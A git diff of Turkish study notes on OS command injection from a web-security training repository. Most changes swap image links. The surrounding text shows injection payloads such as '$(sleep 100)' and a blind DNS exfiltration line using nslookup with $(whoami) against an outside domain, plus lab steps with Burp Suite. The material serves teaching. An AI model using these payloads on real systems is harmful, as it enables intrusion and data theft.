@@ -12,7 +12,7 @@
     - SQL sorgusunda kullanılıyorsa ve parameter bining yapmıyorsa SQLi,
     - İşletim sisteminde çalışacak komutun bir parçasında güvenli bir şekilde yer almıyorsa OS Command Injection.
 #### PHP dilinde ` işareti, komut satırında komut çalıştırıyor.
-![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/fe680a56-8dd4-41a6-ba3d-689b9e0a4852)
+![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/5f0e3632-60e4-4886-b581-b3eaafa037e6)
 - "; ile kodu durdurup geri kalanında istediğini yazabilirsin
 ```sh
 sleep 100; 
@@ -33,17 +33,18 @@ echo BENIM ADIM "MEHMET $(sleep 100) INCE"
 ```sh
 ’$(sleep 100)’
 ```
-![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/745a4f4f-de92-4544-97cd-3e8a2ff42d9b)
+![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/4e505be6-5460-42ea-9e38-c6cad79be5d7)
+
 - Çalıştırdığın komutun çıktısını HTML içeriğinde görebiliyorsan sıkıntı yok.
 - Asenkron yapılarda ise, Blind OS Command Injection gerçekleşir. Bunun için en güzel yöntem “nslookup” tır. Hem windowsta hem linuxta ortak komuttur.
     - nslookup google.com
     - Bu komut çalıştırıldığında sistemdeki default name server ne ise ona gider. Oradan root DNS’e gider, sonrasında senin dns sunucuna gelir ve loglarında görmeye başlarsın.
     - echo BENIM ADIM ‘MEHMET ‘$(nslookup $(whoami).mehmetince.net)’ INCE’
-![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/261b735a-c9a4-422a-8b4a-22be62a1a887)
+![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/a40e07ea-597d-4aee-9a09-0200c210a831)
 - whoami içinde boşluk, değişik karakterler falan olmamalı. Domain, RFC protokolüne uygun bir şeyler olması lazım.
 ## Lab: OS Command Injection, Simple Case
 - Burp suite ile bir ürün sorgusunun trafiğini yakalıyoruz.
-![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/0a7a71eb-ee3b-4b47-bf5d-ac611b79b653)
+![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/17386aed-a9d3-4128-8723-719a8d888225)
 - Stok kontrolü isteği gelince, sunucu arka taraftaki stok kontrolü ile ilgili servise gidiyor yani komut satırında komut çalıştırıyor.
 - Çıktı olarak sunucu integer bir değer bekliyor o yüzden whoami çalışmadı ama sleep 10 komutu çalıştı. Tırnak koymadan yaptı
 - tek tırnak “ veya ‘ koyunca Syntax hatası veriyorsa, arka tarafa parametreler yalın halde gidiyor demektir: checkstock.sh 1 2
@@ -59,7 +60,7 @@ echo BENIM ADIM "MEHMET $(sleep 100) INCE"
     - Demek oluyor ki, arka taraftaki komut çift tırnaklar “ arasına alınmış.
     - $(sleep 10)
 ## Lab: Blind OS Command Injection with output redirection
-![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/f10f5a5d-7538-4f0b-9318-88231e067cef)
+![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/1cf17982-7bde-4c3e-8b15-0561b74d3cec)
 - Zaafiyet BLIND ise, kendi komutunun çıktısı yansımıyor fakat SLEEP ile zaafiyeti doğrulayabilirsin.
 - Kendi komutunun çıktısını bir pathe redirection yaparsan ve o path’e de web üstünden erişebiliyor isen böylece Command Injectionu zaafiyetini sömürebilirsin.
 - inputların hangisini kontrol ettiğimizi bilmiyoruz
